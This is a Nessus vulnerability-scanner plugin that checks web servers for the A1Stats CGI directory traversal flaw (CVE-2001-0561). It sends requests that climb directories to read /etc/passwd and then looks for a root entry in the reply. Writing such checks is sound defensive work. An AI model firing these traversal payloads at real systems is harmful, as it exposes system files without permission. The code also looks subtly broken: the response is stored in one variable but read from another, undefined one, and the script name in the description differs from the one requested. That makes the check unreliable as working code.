#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
 script_id(10669);
 script_version("$Revision: 1.26 $");

 script_cve_id("CVE-2001-0561");
 script_bugtraq_id(2705);
 script_xref(name:"OSVDB", value:"15386");
 
 script_name(english:"A1Stats Multiple Script Traversal Arbitrary File Access");
 script_summary(english:"Checks if A1Stats reads any file");

 script_set_attribute(attribute:"synopsis",value:
"The remote host contains a CGI application that is affected by a
directory traversal vulnerability. ");

 script_set_attribute(attribute:"description",value:
"The 'aldisp.cgi' CGI script was found on this system. This script
allows an attacker to view any file on the target computer by making a
specially crafted GET request.");

 script_set_attribute(attribute:"see_also", value:
"http://archives.neohapsis.com/archives/bugtraq/2001-05/0047.html");

 script_set_attribute(attribute:"solution", value:
"Upgrading to version 1.6 or higher reportedly addresses the issue.");

 script_set_attribute(attribute:"cvss_vector", value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");

script_end_attributes();

 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2001-2009 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");

 script_dependencies("find_service1.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

function check(str)
{
  local_var r, w;
  global_var port;

  w = http_send_recv3(method:"GET", port:port, item:str);
  if (isnull(w)) exit(0);
  r = strcat(r[0], r[1], '\r\n', r[2]);
  if(egrep(pattern:".*root:.*:0:[01]:", string:r))return(1);
  return(0);
}

port = get_http_port(default:80);

if(get_port_state(port))
{
  foreach dir (cgi_dirs())
  {
  req = string(dir, "/a1disp3.cgi?/../../../../../../etc/passwd");
  if(check(str:req)){security_warning(port);exit(0);}
  req = string(dir, "/a1stats/a1disp3.cgi?/../../../../../../etc/passwd");
  if(check(str:req)){security_warning(port);exit(0);}
  }
}
